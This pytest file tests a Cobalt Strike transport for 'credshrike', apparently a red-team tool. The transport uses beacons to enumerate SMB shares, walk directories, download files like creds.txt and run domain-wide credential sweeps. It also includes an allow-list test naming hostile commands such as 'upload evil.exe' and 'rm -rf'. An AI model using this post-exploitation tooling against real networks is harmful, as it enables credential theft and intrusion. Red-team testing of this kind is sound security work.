"""Tests for the Cobalt Strike transport (credshrike/cs_transport.py)."""
import pytest

from credshrike.cs_transport import (CSUndelivered, CSCommandError,
                                     CSParseError, CobaltStrikeTransport,
                                     parse_ls_output, parse_net_share,
                                     parse_net_view, pick_beacon,
                                     _is_whitelisted)
from credshrike.transport import EnumerationTransport

HOST = "FILE01"
UNC_IT = "\\\\FILE01\\IT"
LS_IT = (
    "[*] Listing: \\\\FILE01\\IT\n"
    "\n"
    "    Size     Type    Last Modified         Name\n"
    "    ----     ----    -------------         ----\n"
    "    1mb      dir     06/23/2026 03:11      scripts\n"
    "    48kb     file    06/23/2026 04:10      creds.txt\n")
LS_SCRIPTS = (
    "[*] Listing: \\\\FILE01\\IT\\scripts\n"
    "\n"
    "    Size     Type    Last Modified         Name\n"
    "    ----     ----    -------------         ----\n"
    "    2kb      file    06/23/2026 04:20      run.bat\n")
NETVIEW = (
    "[*] Shares on FILE01:\n"
    "\n"
    "    Name     Type     Remark\n"
    "    ----     ----     -------\n"
    "    C$       special  Default share\n"
    "    IPC$     special  Remote IPC\n"
    "    IT       disk     engineering docs\n")
NETSHARE = (
    "[*] Share name   Resource   Remark\n"
    "\n"
    "    C$        C:\\        Default share\n"
    "    IPC$                Remote IPC\n"
    "    IT        C:\\IT      engineering docs\n")


class FakeCSBackend:
    """Implements the assumed official cobaltstrike-mcp-server contract."""
    poll_interval = 0.01

    def __init__(self, outputs=None, downloads=None, beacons="1 DEV01"):
        self.commands = []          # (tool, args) — every call recorded
        self.outputs = dict(outputs or {})
        self.downloads = list(downloads or [])
        self.beacons = beacons
        self.executions = {}
        self.fetched = []
        self._next = 100

    def call(self, tool, args):
        self.commands.append((tool, args))
        if tool == "cs_list_beacons":
            return self.beacons
        if tool == "cs_execute_command":
            self._next += 1
            eid = str(self._next)
            command = args["command"]
            self.executions[eid] = {"command": command,
                                    "output": self.outputs.get(command)}
            return f"Execution {eid} submitted"
        if tool == "cs_read_command_output":
            entry = self.executions.get(args["execution_id"])
            if entry and entry["output"] is not None:
                return entry["output"]
            return "pending"
        if tool == "cs_list_downloads":
            return "\n".join(self.downloads)
        if tool == "cs_fetch_download":
            self.fetched.append(args["download_id"])
            return f"http://fake/dl/{args['download_id']}"
        raise AssertionError(f"unexpected tool {tool}")

    def submitted_commands(self):
        return [a["command"] for t, a in self.commands
                if t == "cs_execute_command"]


def _transport(outputs=None, downloads=None, host=HOST, **kw):
    backend = FakeCSBackend(outputs=outputs, downloads=downloads)
    return CobaltStrikeTransport(backend, beacon="1", host=host, **kw), backend


# --------------------------------------------------------------------------- #
# parsers
# --------------------------------------------------------------------------- #

def test_parse_ls_output_entries_and_sizes():
    parsed = parse_ls_output(LS_IT, UNC_IT)
    entries = parsed["entries"]
    assert [(e["name"], e["is_dir"]) for e in entries] == \
        [("scripts", True), ("creds.txt", False)]
    assert entries[0]["size"] == 1024 * 1024      # 1mb
    assert entries[1]["size"] == 48 * 1024        # 48kb
    assert entries[1]["written"] == "06/23/2026 04:10"
    assert not parsed["unparsed"]


def test_parse_ls_output_header_mismatch_is_fatal():
    with pytest.raises(CSParseError, match="does not match"):
        parse_ls_output(LS_IT, "\\\\OTHER\\IT")


def test_parse_ls_output_error_lines_map_to_exceptions():
    text = "[-] could not open \\\\FILE01\\IT: The network path was not found\n"
    with pytest.raises(FileNotFoundError):
        parse_ls_output(text, UNC_IT)
    text = "[-] access is denied\n"
    with pytest.raises(PermissionError):
        parse_ls_output(text, UNC_IT)


def test_parse_ls_output_profile_mismatch_refuses_partial():
    garbage = "[*] Listing: \\\\FILE01\\IT\n" + \
              "".join(f"weird row {i}\n" for i in range(6))
    with pytest.raises(CSParseError, match="profile mismatch"):
        parse_ls_output(garbage, UNC_IT)


def test_parse_net_view_shares():
    shares = parse_net_view(NETVIEW, HOST)
    by_name = {s["name"]: s for s in shares}
    assert by_name["C$"]["special"] is True
    assert by_name["IT"]["special"] is False
    assert by_name["IT"]["remark"] == "engineering docs"
    assert len(shares) == 3


def test_parse_net_share_gives_local_paths():
    shares, mapping = parse_net_share(NETSHARE)
    assert mapping["it"] == "C:\\IT"
    assert {s["name"] for s in shares} == {"C$", "IPC$", "IT"}


# --------------------------------------------------------------------------- #
# transport core (against the fake official server)
# --------------------------------------------------------------------------- #

def test_list_shares_remote():
    t, backend = _transport(outputs={f"net view \\\\{HOST}": NETVIEW})
    shares = t.list_shares()
    assert backend.submitted_commands() == [f"net view \\\\{HOST}"]
    assert {s["name"] for s in shares} == {"C$", "IPC$", "IT"}


def test_list_dir_contract_shape():
    t, backend = _transport(outputs={f"ls {UNC_IT}": LS_IT})
    out = t.list_dir("IT", "", max_entries=1)
    assert out["share"] == "IT" and out["path"] == ""
    assert out["truncated"] is True and out["total_seen"] == 2
    assert out["entries"][0]["name"] == "scripts"


def test_read_file_slices_and_b64(monkeypatch):
    monkeypatch.setattr(CobaltStrikeTransport, "_http_get",
                        staticmethod(lambda link: b"ABCDEF"))
    t, backend = _transport(
        outputs={f"download {UNC_IT}\\creds.txt": "started"},
        downloads=["104 \\\\FILE01\\IT\\creds.txt complete"])
    out = t.read_file("IT", "creds.txt", offset=2, max_bytes=3)
    assert backend.fetched == ["104"]
    import base64
    assert base64.b64decode(out["content_b64"]) == b"CDE"
    assert out["size"] == 3 and out["truncated"] is True   # cap reached


def test_stat_uses_parent_listing():
    t, _ = _transport(outputs={f"ls {UNC_IT}": LS_IT})
    st = t.stat("IT", "creds.txt")
    assert st["name"] == "creds.txt" and st["is_dir"] is False


def test_localhost_mode_maps_shares_to_local_paths():
    outputs = {"net share": NETSHARE,
               "ls C:\\IT\\x": LS_SCRIPTS.replace(
                   "\\\\FILE01\\IT\\scripts", "C:\\IT\\x")}
    t, backend = _transport(outputs=outputs, host="localhost")
    shares = t.list_shares()
    assert backend.submitted_commands()[0] == "net share"
    out = t.list_dir("IT", "x")
    assert backend.submitted_commands()[-1] == "ls C:\\IT\\x"
    assert out["entries"][0]["name"] == "run.bat"


# --------------------------------------------------------------------------- #
# safety + reliability
# --------------------------------------------------------------------------- #

def test_only_whitelisted_commands_can_ever_be_submitted():
    t, _ = _transport()
    with pytest.raises(CSCommandError, match="non-template"):
        t._submit("shell whoami")
    with pytest.raises(CSCommandError, match="non-template"):
        t._submit("upload evil.exe")
    with pytest.raises(CSCommandError, match="non-template"):
        t._submit("ls x; rm -rf")
    assert _is_whitelisted("ls \\\\H\\s", "H")
    assert _is_whitelisted("download \\\\H\\s\\f", "H")
    assert _is_whitelisted("net view \\\\H", "H")
    assert _is_whitelisted("net share", "H")


def test_deadline_marks_undelivered_not_hung():
    t, _ = _transport(outputs={})    # nothing ever completes
    t.deadline_seconds = 0.05
    exec_id = t._submit("ls \\\\FILE01\\IT")
    with pytest.raises(CSUndelivered):
        t._wait(exec_id)


def test_batch_submit_and_drain():
    outputs = {f"ls {UNC_IT}": LS_IT,
               f"ls {UNC_IT}\\scripts": LS_SCRIPTS}
    t, backend = _transport(outputs=outputs)
    t1 = t.submit_list_dir("IT", "")
    t2 = t.submit_list_dir("IT", "scripts")
    t.deadline_seconds = 0.05
    t3 = t._submit("ls \\\\FILE01\\missing")   # never completes
    import time as _time
    results = {}
    deadline = 200
    while len(results) < 3 and deadline:
        for eid, res in t.drain():
            results[eid] = res
        _time.sleep(0.005)      # drain is non-blocking; let the deadline pass
        deadline -= 1
    assert isinstance(results[t1], dict) and results[t1]["entries"]
    assert isinstance(results[t2], dict)
    assert isinstance(results[t3], CSUndelivered)   # coverage can see it
    assert t.pending_count() == 0


def test_transport_is_an_enumeration_transport():
    t, _ = _transport()
    assert isinstance(t, EnumerationTransport)


def test_pick_beacon_explicit_then_auto():
    backend = FakeCSBackend()
    assert pick_beacon(backend, "7") == "7"
    assert pick_beacon(backend, "") == "1"
    assert pick_beacon(backend, "auto") == "1"


# --------------------------------------------------------------------------- #
# M3: beacon chooser, sleep boost, batched walking
# --------------------------------------------------------------------------- #

def test_beacon_chooser_affinity_and_round_robin():
    from credshrike.cs_transport import BeaconChooser
    beacons = [("1", "DEV01  10.0.0.5  user CORP\alice"),
               ("2", "OPS01  10.0.1.9  user CORP\bob")]
    c = BeaconChooser(beacons, "affinity")
    assert c.pick("dev01.corp.local") == "1"     # hostname match wins
    assert c.pick("ops01") == "2"
    assert [c.pick("file01") for _ in range(3)] == ["1", "2", "1"]  # rr
    assert BeaconChooser(beacons, "7").pick("any") == "7"           # explicit
    assert BeaconChooser(beacons, "first").pick("x") == "1"
    with pytest.raises(CSCommandError):
        BeaconChooser([], "affinity").pick("x")


def test_sleep_boost_applies_to_all_and_restores(monkeypatch):
    import credshrike.cs_transport as cs
    import credshrike.smb_session as ss
    from credshrike.config import Policy

    backend = FakeCSBackend(beacons="1 DEV01\n2 OPS01")
    monkeypatch.setattr(cs, "RealCSBackend", lambda url, token: backend)
    policy = Policy()
    policy.transport = "cs-mcp"
    policy.cs_mcp_url = "http://fake"
    policy.cs_beacon = "affinity"
    policy.cs_sleep_boost = "5 50:60 50"
    cs.arm_cs_transport(policy)
    try:
        boost_cmds = [a["command"] for t, a in backend.commands
                      if a.get("command", "").startswith("sleep ")]
        assert boost_cmds == ["sleep 5 50", "sleep 5 50"]   # every beacon
        t = ss.create_smb_session(None, "ops01")
        assert isinstance(t, CobaltStrikeTransport) and t.beacon == "2"
    finally:
        ss.disarm_transport()
    restore = [a["command"] for t, a in backend.commands
               if a.get("command", "").startswith("sleep ")]
    assert restore == ["sleep 5 50", "sleep 5 50",
                       "sleep 60 50", "sleep 60 50"]


def test_batched_walker_levels_and_undelivered():
    from credshrike.agent.orchestrator import _walk_share_files
    outputs = {f"ls {UNC_IT}": LS_IT,
               f"ls {UNC_IT}\scripts": LS_SCRIPTS}
    t, backend = _transport(outputs=outputs)
    t.deadline_seconds = 0.05
    seen = []
    lines = []
    files, dirs, skipped = _walk_share_files(
        t, "IT", depth=3, max_files=50, echo=lines.append,
        on_file=lambda f: seen.append(f["path"]))
    assert sorted(seen) == ["creds.txt", "scripts/run.bat"]
    assert dirs == 2 and not skipped


def test_batched_walker_survives_undelivered_dir():
    from credshrike.agent.orchestrator import _walk_share_files
    # scripts dir never completes → walk_error, sibling file still collected
    outputs = {f"ls {UNC_IT}": LS_IT}
    t, _ = _transport(outputs=outputs)
    t.deadline_seconds = 0.05
    lines = []
    files, dirs, _ = _walk_share_files(t, "IT", depth=3, max_files=50,
                                       echo=lines.append)
    assert [f["path"] for f in files] == ["creds.txt"]
    assert any("walk_error" in l and "scripts" in l for l in lines)
    assert any("creds.txt" == f["path"] for f in files)


def test_domain_sweep_end_to_end_through_cs_transport(tmp_path, monkeypatch):
    """The whole stack through the CS seam: armed provider → walker (batch
    submit/drain) → reads (download links) → report labelled 'Cobalt
    Strike'."""
    import base64 as b64
    import credshrike.smb_session as ss
    from credshrike.agent.orchestrator import run_domain_sweep
    from test_orchestrator import _client_factory_for_hosts, _computers, \
        _credential

    UNC_CRED = UNC_IT + chr(92) + "creds.txt"
    outputs = {f"net view {chr(92) * 2}{HOST}": NETVIEW,
               f"ls {UNC_IT}": LS_IT,
               f"download {UNC_CRED}": "ok"}
    backend = FakeCSBackend(
        outputs=outputs,
        downloads=["101 " + UNC_CRED + " complete"])
    monkeypatch.setattr(CobaltStrikeTransport, "_http_get",
                        staticmethod(lambda link: b"DB_PASSWORD=Winter!\n"))
    ss.arm_transport(lambda host: CobaltStrikeTransport(
        backend, beacon="1", host=host, deadline_seconds=30))
    try:
        from credshrike.config import Policy
        policy = Policy()
        policy.analysis_mode = "batch"       # dump path exercises the walker
        policy.analysis_triage = False
        policy.transport = "cs-mcp"
        factory = _client_factory_for_hosts({"FILE01": []})
        from credshrike.domain.base import ComputerRecord
        result = run_domain_sweep(
            credential=_credential(), policy=policy,
            audit_dir=str(tmp_path), client_factory=factory,
            echo=lambda l: None,
            source_override=lambda: [ComputerRecord(cn="FILE01",
                                                    dns_name=HOST)],
            reachable_check=lambda host: True)
        assert result["hosts"][0]["status"] == "done"
        index = open(result["index_html"], encoding="utf-8").read()
        assert "Cobalt Strike (official CS MCP)" in index
        import os
        per_host = open(os.path.join(result["run_dir"],
                                     result["hosts"][0]["html"]),
                        encoding="utf-8").read()
        assert "Cobalt Strike (beacon 1)" in per_host
        # only whitelisted commands ever reached the (fake) server
        submitted = backend.submitted_commands()
        assert all(c.startswith(("ls ", "net view", "download "))
                   for c in submitted), submitted
    finally:
        ss.disarm_transport()
